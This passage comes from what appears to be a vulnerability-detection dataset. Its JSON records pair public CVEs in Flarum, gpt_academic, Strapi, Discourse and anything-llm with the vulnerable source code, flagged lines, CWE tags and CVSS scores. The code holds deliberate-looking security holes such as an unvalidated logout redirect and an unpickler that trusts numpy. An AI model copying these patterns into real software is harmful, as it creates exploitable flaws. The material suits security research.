srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 100,
          "content": "        try:"
        },
        {
          "line_no": 106,
          "content": "        except ValueError:"
        },
        {
          "line_no": 107,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 108,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 27,
    "cve": "CVE-2024-21641",
    "description": "Flarum is open source discussion platform software. Prior to version 1.8.5, the Flarum `/logout` route includes a redirect parameter that allows any third party to redirect users from a (trusted) domain of the Flarum installation to redirect to any link. For logged-in users, the logout must be confirmed. Guests are immediately redirected. This could be used by spammers to redirect to a web address using a trusted domain of a running Flarum installation. The vulnerability has been fixed and published as flarum/core v1.8.5. As a workaround, some extensions modifying the logout route can remedy this issue if their implementation is safe.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/Forum/Controller/LogOutController.php",
          "content": "<?php\n\n/*\n * This file is part of Flarum.\n *\n * For detailed copyright and license information, please view the\n * LICENSE file that was distributed with this source code.\n */\n\nnamespace Flarum\\Forum\\Controller;\n\nuse Flarum\\Http\\Exception\\TokenMismatchException;\nuse Flarum\\Http\\Rememberer;\nuse Flarum\\Http\\RequestUtil;\nuse Flarum\\Http\\SessionAuthenticator;\nuse Flarum\\Http\\UrlGenerator;\nuse Flarum\\User\\Event\\LoggedOut;\nuse Illuminate\\Contracts\\Events\\Dispatcher;\nuse Illuminate\\Contracts\\View\\Factory;\nuse Illuminate\\Support\\Arr;\nuse Laminas\\Diactoros\\Response\\HtmlResponse;\nuse Laminas\\Diactoros\\Response\\RedirectResponse;\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface as Request;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\n\nclass LogOutController implements RequestHandlerInterface\n{\n    /**\n     * @var Dispatcher\n     */\n    protected $events;\n\n    /**\n     * @var SessionAuthenticator\n     */\n    protected $authenticator;\n\n    /**\n     * @var Rememberer\n     */\n    protected $rememberer;\n\n    /**\n     * @var Factory\n     */\n    protected $view;\n\n    /**\n     * @var UrlGenerator\n     */\n    protected $url;\n\n    /**\n     * @param Dispatcher $events\n     * @param SessionAuthenticator $authenticator\n     * @param Rememberer $rememberer\n     * @param Factory $view\n     * @param UrlGenerator $url\n     */\n    public function __construct(\n        Dispatcher $events,\n        SessionAuthenticator $authenticator,\n        Rememberer $rememberer,\n        Factory $view,\n        UrlGenerator $url\n    ) {\n        $this->events = $events;\n        $this->authenticator = $authenticator;\n        $this->rememberer = $rememberer;\n        $this->view = $view;\n        $this->url = $url;\n    }\n\n    /**\n     * @param Request $request\n     * @return ResponseInterface\n     * @throws TokenMismatchException\n     */\n    public function handle(Request $request): ResponseInterface\n    {\n        $session = $request->getAttribute('session');\n        $actor = RequestUtil::getActor($request);\n\n        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());\n\n        // If there is no user logged in, return to the index.\n        if ($actor->isGuest()) {\n            return new RedirectResponse($url);\n        }\n\n        // If a valid CSRF token hasn't been provided, show a view which will\n        // allow the user to press a button to complete the log out process.\n        $csrfToken = $session->token();\n\n        if (Arr::get($request->getQueryParams(), 'token') !== $csrfToken) {\n            $return = Arr::get($request->getQueryParams(), 'return');\n\n            $view = $this->view->make('flarum.forum::log-out')\n                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));\n\n            return new HtmlResponse($view->render());\n        }\n\n        $accessToken = $session->get('access_token');\n        $response = new RedirectResponse($url);\n\n        $this->authenticator->logOut($session);\n\n        $actor->accessTokens()->where('token', $accessToken)->delete();\n\n        $this->events->dispatch(new LoggedOut($actor, false));\n\n        return $this->rememberer->forget($response);\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function __construct(\n        Dispatcher $events,\n        SessionAuthenticator $authenticator,\n        Rememberer $rememberer,\n        Factory $view,\n        UrlGenerator $url\n    ) {\n        $this->events = $events;\n        $this->authenticator = $authenticator;\n        $this->rememberer = $rememberer;\n        $this->view = $view;\n        $this->url = $url;\n    }",
        "public function handle(Request $request): ResponseInterface\n    {\n        $session = $request->getAttribute('session');\n        $actor = RequestUtil::getActor($request);\n\n        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());\n\n        // If there is no user logged in, return to the index.\n        if ($actor->isGuest()) {\n            return new RedirectResponse($url);\n        }\n\n        // If a valid CSRF token hasn't been provided, show a view which will\n        // allow the user to press a button to complete the log out process.\n        $csrfToken = $session->token();\n\n        if (Arr::get($request->getQueryParams(), 'token') !== $csrfToken) {\n            $return = Arr::get($request->getQueryParams(), 'return');\n\n            $view = $this->view->make('flarum.forum::log-out')\n                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));\n\n            return new HtmlResponse($view->render());\n        }\n\n        $accessToken = $session->get('access_token');\n        $response = new RedirectResponse($url);\n\n        $this->authenticator->logOut($session);\n\n        $actor->accessTokens()->where('token', $accessToken)->delete();\n\n        $this->events->dispatch(new LoggedOut($actor, false));\n\n        return $this->rememberer->forget($response);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "        UrlGenerator $url"
        },
        {
          "line_no": 85,
          "content": "        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());"
        },
        {
          "line_no": 87,
          "content": "        // If there is no user logged in, return to the index."
        },
        {
          "line_no": 89,
          "content": "            return new RedirectResponse($url);"
        },
        {
          "line_no": 97,
          "content": "            $return = Arr::get($request->getQueryParams(), 'return');"
        },
        {
          "line_no": 100,
          "content": "                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));"
        },
        {
          "line_no": 106,
          "content": "        $response = new RedirectResponse($url);"
        }
      ]
    },
    "cwe": [
      "CWE-601"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 1396,
    "cve": "CVE-2024-11039",
    "description": "A pickle deserialization vulnerability exists in the Latex English error correction plug-in function of binary-husky/gpt_academic versions up to and including 3.83. This vulnerability allows attackers to achieve remote command execution by deserializing untrusted data. The issue arises from the inclusion of numpy in the deserialization whitelist, which can be exploited by constructing a malicious compressed package containing a merge_result.pkl file and a merge_proofread_en.tex file. The vulnerability is fixed in commit 91f5e6b.",
    "vulnerability": {
      "file_level": [
        {
          "name": "crazy_functions/latex_fns/latex_pickle_io.py",
          "content": "import pickle\n\n\nclass SafeUnpickler(pickle.Unpickler):\n\n    def get_safe_classes(self):\n        from crazy_functions.latex_fns.latex_actions import LatexPaperFileGroup, LatexPaperSplit\n        from crazy_functions.latex_fns.latex_toolbox import LinkedListNode\n        # 定义允许的安全类\n        safe_classes = {\n            # 在这里添加其他安全的类\n            'LatexPaperFileGroup': LatexPaperFileGroup,\n            'LatexPaperSplit': LatexPaperSplit,\n            'LinkedListNode': LinkedListNode,\n        }\n        return safe_classes\n\n    def find_class(self, module, name):\n        # 只允许特定的类进行反序列化\n        self.safe_classes = self.get_safe_classes()\n        match_class_name = None\n        for class_name in self.safe_classes.keys():\n            if (class_name in f'{module}.{name}'):\n                match_class_name = class_name\n        if module == 'numpy' or module.startswith('numpy.'):\n            return super().find_class(module, name)\n        if match_class_name is not None:\n            return self.safe_classes[match_class_name]\n        # 如果尝试加载未授权的类，则抛出异常\n        raise pickle.UnpicklingError(f\"Attempted to deserialize unauthorized class '{name}' from module '{module}'\")\n\ndef objdump(obj, file=\"objdump.tmp\"):\n\n    with open(file, \"wb+\") as f:\n        pickle.dump(obj, f)\n    return\n\n\ndef objload(file=\"objdump.tmp\"):\n    import os\n\n    if not os.path.exists(file):\n        return\n    with open(file, \"rb\") as f:\n        unpickler = SafeUnpickler(f)\n        return unpickler.load()\n"
        }
      ],
      "method_level": [
        "def find_class(self, module, name):\n        # 只允许特定的类进行反序列化\n        self.safe_classes = self.get_safe_classes()\n        match_class_name = None\n        for class_name in self.safe_classes.keys():\n            if (class_name in f'{module}.{name}'):\n                match_class_name = class_name\n        if module == 'numpy' or module.startswith('numpy.'):\n            return super().find_class(module, name)\n        if match_class_name is not None:\n            return self.safe_classes[match_class_name]\n        # 如果尝试加载未授权的类，则抛出异常\n        raise pickle.UnpicklingError(f\"Attempted to deserialize unauthorized class '{name}' from module '{module}'\")"
      ],
      "hunk_level": [
        {
          "line_no": 25,
          "content": "        if module == 'numpy' or module.startswith('numpy.'):"
        },
        {
          "line_no": 26,
          "content": "            return super().find_class(module, name)"
        }
      ]
    },
    "cwe": [
      "CWE-502"
    ],
    "severity": "HIGH",
    "cvss_score": 8.8,
    "cvss_version": 3.0
  },
  {
    "id": 838,
    "cve": "CVE-2024-29181",
    "description": "Strapi is an open-source content management system. Prior to version 4.19.1, a super admin can create a collection where an item in the collection has an association to another collection. When this happens, another user with Author Role can see the list of associated items they did not create. They should see nothing but their own items they created not all items ever created. Users should upgrade @strapi/plugin-content-manager to version 4.19.1 to receive a patch.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/core/content-type-builder/admin/src/components/FormModal/component/createComponentSchema.ts",
          "content": "import { translatedErrors as errorsTrads } from '@strapi/helper-plugin';\nimport * as yup from 'yup';\n\nimport { getTrad } from '../../../utils/getTrad';\nimport { CATEGORY_NAME_REGEX } from '../category/regex';\nimport { createComponentUid } from '../utils/createUid';\n\nexport const createComponentSchema = (\n  usedComponentNames: Array<string>,\n  reservedNames: Array<string>,\n  category: string\n) => {\n  const shape = {\n    displayName: yup\n      .string()\n      .test({\n        name: 'nameAlreadyUsed',\n        message: errorsTrads.unique,\n        test(value) {\n          if (!value) {\n            return false;\n          }\n\n          const name = createComponentUid(value, category);\n\n          return !usedComponentNames.includes(name);\n        },\n      })\n      .test({\n        name: 'nameNotAllowed',\n        message: getTrad('error.contentTypeName.reserved-name'),\n        test(value) {\n          if (!value) {\n            return false;\n          }\n          return !reservedNames.includes(value?.trim()?.toLowerCase());\n        },\n      })\n      .required(errorsTrads.required),\n    category: yup\n      .string()\n      .matches(CATEGORY_NAME_REGEX, errorsTrads.regex)\n      .required(errorsTrads.required),\n\n    icon: yup.string(),\n  };\n\n  return yup.object(shape);\n};\n"
        }
      ],
      "method_level": [
        "createComponentSchema"
      ],
      "hunk_level": [
        {
          "line_no": 11,
          "content": "  category: string"
        },
        {
          "line_no": 26,
          "content": "          return !usedComponentNames.includes(name);"
        }
      ]
    },
    "cwe": [
      "CWE-639"
    ],
    "severity": "LOW",
    "cvss_score": 2.3,
    "cvss_version": 3.1
  },
  {
    "id": 1019,
    "cve": "CVE-2024-39320",
    "description": "Discourse is an open source discussion platform. Prior to 3.2.5 and 3.3.0.beta5, the vulnerability allows an attacker to inject iframes from any domain, bypassing the intended restrictions enforced by the allowed_iframes setting. This vulnerability is fixed in 3.2.5 and 3.3.0.beta5.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/assets/javascripts/discourse-markdown-it/src/options.js",
          "content": "import { deepMerge } from \"discourse-common/lib/object\";\n\n// the options are passed here and must be explicitly allowed with\n// the const options & state below\nexport default function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}\n"
        }
      ],
      "method_level": [
        "function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}"
      ],
      "hunk_level": [
        {
          "line_no": 68,
          "content": "      ? siteSettings.allowed_iframes.split(\"|\")"
        },
        {
          "line_no": 69,
          "content": "      : [],"
        }
      ]
    },
    "cwe": [
      "CWE-74",
      "CWE-1021"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 28,
    "cve": "CVE-2024-21641",
    "description": "Flarum is open source discussion platform software. Prior to version 1.8.5, the Flarum `/logout` route includes a redirect parameter that allows any third party to redirect users from a (trusted) domain of the Flarum installation to redirect to any link. For logged-in users, the logout must be confirmed. Guests are immediately redirected. This could be used by spammers to redirect to a web address using a trusted domain of a running Flarum installation. The vulnerability has been fixed and published as flarum/core v1.8.5. As a workaround, some extensions modifying the logout route can remedy this issue if their implementation is safe.",
    "vulnerability": {
      "file_level": [
        {
          "name": "framework/core/src/Forum/Controller/LogOutController.php",
          "content": "<?php\n\n/*\n * This file is part of Flarum.\n *\n * For detailed copyright and license information, please view the\n * LICENSE file that was distributed with this source code.\n */\n\nnamespace Flarum\\Forum\\Controller;\n\nuse Flarum\\Http\\Exception\\TokenMismatchException;\nuse Flarum\\Http\\Rememberer;\nuse Flarum\\Http\\RequestUtil;\nuse Flarum\\Http\\SessionAuthenticator;\nuse Flarum\\Http\\UrlGenerator;\nuse Flarum\\User\\Event\\LoggedOut;\nuse Illuminate\\Contracts\\Events\\Dispatcher;\nuse Illuminate\\Contracts\\View\\Factory;\nuse Illuminate\\Support\\Arr;\nuse Laminas\\Diactoros\\Response\\HtmlResponse;\nuse Laminas\\Diactoros\\Response\\RedirectResponse;\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface as Request;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\n\nclass LogOutController implements RequestHandlerInterface\n{\n    /**\n     * @var Dispatcher\n     */\n    protected $events;\n\n    /**\n     * @var SessionAuthenticator\n     */\n    protected $authenticator;\n\n    /**\n     * @var Rememberer\n     */\n    protected $rememberer;\n\n    /**\n     * @var Factory\n     */\n    protected $view;\n\n    /**\n     * @var UrlGenerator\n     */\n    protected $url;\n\n    /**\n     * @param Dispatcher $events\n     * @param SessionAuthenticator $authenticator\n     * @param Rememberer $rememberer\n     * @param Factory $view\n     * @param UrlGenerator $url\n     */\n    public function __construct(\n        Dispatcher $events,\n        SessionAuthenticator $authenticator,\n        Rememberer $rememberer,\n        Factory $view,\n        UrlGenerator $url\n    ) {\n        $this->events = $events;\n        $this->authenticator = $authenticator;\n        $this->rememberer = $rememberer;\n        $this->view = $view;\n        $this->url = $url;\n    }\n\n    /**\n     * @param Request $request\n     * @return ResponseInterface\n     * @throws TokenMismatchException\n     */\n    public function handle(Request $request): ResponseInterface\n    {\n        $session = $request->getAttribute('session');\n        $actor = RequestUtil::getActor($request);\n\n        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());\n\n        // If there is no user logged in, return to the index.\n        if ($actor->isGuest()) {\n            return new RedirectResponse($url);\n        }\n\n        // If a valid CSRF token hasn't been provided, show a view which will\n        // allow the user to press a button to complete the log out process.\n        $csrfToken = $session->token();\n\n        if (Arr::get($request->getQueryParams(), 'token') !== $csrfToken) {\n            $return = Arr::get($request->getQueryParams(), 'return');\n\n            $view = $this->view->make('flarum.forum::log-out')\n                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));\n\n            return new HtmlResponse($view->render());\n        }\n\n        $accessToken = $session->get('access_token');\n        $response = new RedirectResponse($url);\n\n        $this->authenticator->logOut($session);\n\n        $actor->accessTokens()->where('token', $accessToken)->delete();\n\n        $this->events->dispatch(new LoggedOut($actor, false));\n\n        return $this->rememberer->forget($response);\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function __construct(\n        Dispatcher $events,\n        SessionAuthenticator $authenticator,\n        Rememberer $rememberer,\n        Factory $view,\n        UrlGenerator $url\n    ) {\n        $this->events = $events;\n        $this->authenticator = $authenticator;\n        $this->rememberer = $rememberer;\n        $this->view = $view;\n        $this->url = $url;\n    }",
        "public function handle(Request $request): ResponseInterface\n    {\n        $session = $request->getAttribute('session');\n        $actor = RequestUtil::getActor($request);\n\n        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());\n\n        // If there is no user logged in, return to the index.\n        if ($actor->isGuest()) {\n            return new RedirectResponse($url);\n        }\n\n        // If a valid CSRF token hasn't been provided, show a view which will\n        // allow the user to press a button to complete the log out process.\n        $csrfToken = $session->token();\n\n        if (Arr::get($request->getQueryParams(), 'token') !== $csrfToken) {\n            $return = Arr::get($request->getQueryParams(), 'return');\n\n            $view = $this->view->make('flarum.forum::log-out')\n                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));\n\n            return new HtmlResponse($view->render());\n        }\n\n        $accessToken = $session->get('access_token');\n        $response = new RedirectResponse($url);\n\n        $this->authenticator->logOut($session);\n\n        $actor->accessTokens()->where('token', $accessToken)->delete();\n\n        $this->events->dispatch(new LoggedOut($actor, false));\n\n        return $this->rememberer->forget($response);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "        UrlGenerator $url"
        },
        {
          "line_no": 85,
          "content": "        $url = Arr::get($request->getQueryParams(), 'return', $this->url->to('forum')->base());"
        },
        {
          "line_no": 87,
          "content": "        // If there is no user logged in, return to the index."
        },
        {
          "line_no": 89,
          "content": "            return new RedirectResponse($url);"
        },
        {
          "line_no": 97,
          "content": "            $return = Arr::get($request->getQueryParams(), 'return');"
        },
        {
          "line_no": 100,
          "content": "                ->with('url', $this->url->to('forum')->route('logout').'?token='.$csrfToken.($return ? '&return='.urlencode($return) : ''));"
        },
        {
          "line_no": 106,
          "content": "        $response = new RedirectResponse($url);"
        }
      ]
    },
    "cwe": [
      "CWE-601"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 1406,
    "cve": "CVE-2024-8249",
    "description": "mintplex-labs/anything-llm version git 6dc3642 contains an unauthenticated Denial of Service (DoS) vulnerability in the API for the embeddable chat functionality. An attacker can exploit this vulnerability by sending a malformed JSON payload to the API endpoint, causing a server crash due to an uncaught exception. This issue is fixed in version 1.2.2.",
    "vulnerability": {
      "file_level": [
        {
          "name": "server/utils/middleware/embedMiddleware.js",
          "content": "const { v4: uuidv4 } = require(\"uuid\");\nconst { VALID_CHAT_MODE } = require(\"../chats/stream\");\nconst { EmbedChats } = require(\"../../models/embedChats\");\nconst { EmbedConfig } = require(\"../../models/embedConfig\");\nconst { reqBody } = require(\"../http\");\n\n// Finds or Aborts request for a /:embedId/ url. This should always\n// be the first middleware and the :embedID should be in the URL.\nasync function validEmbedConfig(request, response, next) {\n  const { embedId } = request.params;\n\n  const embed = await EmbedConfig.getWithWorkspace({ uuid: embedId });\n  if (!embed) {\n    response.sendStatus(404).end();\n    return;\n  }\n\n  response.locals.embedConfig = embed;\n  next();\n}\n\nfunction setConnectionMeta(request, response, next) {\n  response.locals.connection = {\n    host: request.headers?.origin,\n    ip: request?.ip,\n  };\n  next();\n}\n\nasync function validEmbedConfigId(request, response, next) {\n  const { embedId } = request.params;\n\n  const embed = await EmbedConfig.get({ id: Number(embedId) });\n  if (!embed) {\n    response.sendStatus(404).end();\n    return;\n  }\n\n  response.locals.embedConfig = embed;\n  next();\n}\n\nasync function canRespond(request, response, next) {\n  const embed = response.locals.embedConfig;\n  if (!embed) {\n    response.sendStatus(404).end();\n    return;\n  }\n\n  // Block if disabled by admin.\n  if (!embed.enabled) {\n    response.status(503).json({\n      id: uuidv4(),\n      type: \"abort\",\n      textResponse: null,\n      sources: [],\n      close: true,\n      error:\n        \"This chat has been disabled by the administrator - try again later.\",\n    });\n    return;\n  }\n\n  // Check if requester hostname is in the valid allowlist of domains.\n  const host = request.headers.origin ?? \"\";\n  const allowedHosts = EmbedConfig.parseAllowedHosts(embed);\n  if (allowedHosts !== null && !allowedHosts.includes(host)) {\n    response.status(401).json({\n      id: uuidv4(),\n      type: \"abort\",\n      textResponse: null,\n      sources: [],\n      close: true,\n      error: \"Invalid request.\",\n    });\n    return;\n  }\n\n  const { sessionId, message } = reqBody(request);\n\n  if (!message?.length || !VALID_CHAT_MODE.includes(embed.chat_mode)) {\n    response.status(400).json({\n      id: uuidv4(),\n      type: \"abort\",\n      textResponse: null,\n      sources: [],\n      close: true,\n      error: !message?.length\n        ? \"Message is empty.\"\n        : `${embed.chat_mode} is not a valid mode.`,\n    });\n    return;\n  }\n\n  if (!isNaN(embed.max_chats_per_day) && Number(embed.max_chats_per_day) > 0) {\n    const dailyChatCount = await EmbedChats.count({\n      embed_id: embed.id,\n      createdAt: {\n        gte: new Date(new Date() - 24 * 60 * 60 * 1000),\n      },\n    });\n\n    if (dailyChatCount >= Number(embed.max_chats_per_day)) {\n      response.status(429).json({\n        id: uuidv4(),\n        type: \"abort\",\n        textResponse: null,\n        sources: [],\n        close: true,\n        error:\n          \"The quota for this chat has been reached. Try again later or contact the site owner.\",\n      });\n      return;\n    }\n  }\n\n  if (\n    !isNaN(embed.max_chats_per_session) &&\n    Number(embed.max_chats_per_session) > 0\n  ) {\n    const dailySessionCount = await EmbedChats.count({\n      embed_id: embed.id,\n      session_id: sessionId,\n      createdAt: {\n        gte: new Date(new Date() - 24 * 60 * 60 * 1000),\n      },\n    });\n\n    if (dailySessionCount >= Number(embed.max_chats_per_session)) {\n      response.status(429).json({\n        id: uuidv4(),\n        type: \"abort\",\n        textResponse: null,\n        sources: [],\n        close: true,\n        error:\n          \"Your quota for this chat has been reached. Try again later or contact the site owner.\",\n      });\n      return;\n    }\n  }\n\n  next();\n}\n\nmodule.exports = {\n  setConnectionMeta,\n  validEmbedConfig,\n  validEmbedConfigId,\n  canRespond,\n};\n"
        }
      ],
      "method_level": [
        "async function canRespond(request, response, next) {\n  const embed = response.locals.embedConfig;\n  if (!embed) {\n    response.sendStatus(404).end();\n    return;\n  }\n\n  // Block if disabled by admin.\n  if (!embed.enabled) {\n    response.status(503).json({\n      id: uuidv4(),\n      type: \"abort\",\n      textResponse: null,\n      sources: [],\n      close: true,\n      error:\n        \"This chat has been disabled by the administrator - try again later.\",\n    });\n    return;\n  }\n\n  // Check if requester hostname is in the valid allowlist of domains.\n  const host = request.headers.origin ?? \"\";\n  const allowedHosts = EmbedConfig.parseAllowedHosts(embed);\n  if (allowedHosts !== null && !allowedHosts.includes(host)) {\n    response.status(401).json({\n      id: uuidv4(),\n      type: \"abort\",\n      textResponse: null,\n      sources: [],\n      close: true,\n      error: \"Invalid request.\",\n    });\n    return;\n  }\n\n  const { sessionId, message } = reqBody(request);\n\n  if (!message?.length || !VALID_CHAT_MODE.includes(embed.chat_mode)) {\n    response.status(400).json({\n      id: uuidv4(),\n      type: \"abort\",\n      textResponse: null,\n      sources: [],\n      close: true,\n      error: !message?.length\n        ? \"Message is empty.\"\n        : `${embed.chat_mode} is not a valid mode.`,\n    });\n    return;\n  }\n\n  if (!isNaN(embed.max_chats_per_day) && Number(embed.max_chats_per_day) > 0) {\n    const dailyChatCount = await EmbedChats.count({\n      embed_id: embed.id,\n      createdAt: {\n        gte: new Date(new Date() - 24 * 60 * 60 * 1000),\n      },\n    });\n\n    if (dailyChatCount >= Number(embed.max_chats_per_day)) {\n      response.status(429).json({\n        id: uuidv4(),\n        type: \"abort\",\n        textResponse: null,\n        sources: [],\n        close: true,\n        error:\n          \"The quota for this chat has been reached. Try again later or contact the site owner.\",\n      });\n      return;\n    }\n  }\n\n  if (\n    !isNaN(embed.max_chats_per_session) &&\n    Number(embed.max_chats_per_session) > 0\n  ) {\n    const dailySessionCount = await EmbedChats.count({\n      embed_id: embed.id,\n      session_id: sessionId,\n      createdAt: {\n        gte: new Date(new Date() - 24 * 60 * 60 * 1000),\n      },\n    });\n\n    if (dailySessionCount >= Number(embed.max_chats_per_session)) {\n      response.status(429).json({\n        id: uuidv4(),\n        type: \"abort\",\n        textResponse: null,\n        sources: [],\n        close: true,\n        error:\n          \"Your quota for this chat has been reached. Try again later or contact the site owner.\",\n      });\n      return;\n    }\n  }\n\n  next();\n}"
      ],
      "hunk_level": [
        {
          "line_no": 44,
          "content": "  const embed = response.locals.embedConfig;"
        },
        {
          "line_no": 45,
          "content": "  if (!embed) {"
        },
        {
          "line_no": 46,
          "content": "    response.sendStatus(404).end();"
        },
        {
          "line_no": 47,
          "content": "    return;"
        },
        {
          "line_no": 48,
          "content": "  }"
        },
        {
          "line_no": 50,
          "content": "  // Block if disabled by admin."
        },
        {
          "line_no": 51,
          "content": "  if (!embed.enabled) {"
        },
        {
          "line_no": 52,
          "content": "    response.status(503).json({"
        },
        {
          "line_no": 53,
          "content": "      id: uuidv4(),"
        },
        {
          "line_no": 54,
          "content": "      type: \"abort\","
        },
        {
          "line_no": 55,
          "content": "      textResponse: null,"
        },
        {
          "line_no": 56,
          "content": "      sources: [],"
        },
        {
          "line_no": 57,
          "content": "      close: true,"
        },
        {
          "line_no": 58,
          "content": "      error:"
        },
        {
          "line_no": 59,
          "content": "        \"This chat has been disabled by the administrator - try again later.\","
        },
        {
          "line_no": 60,
          "content": "    });"
        },
        {
          "line_no": 61,
          "content": "    return;"
        },
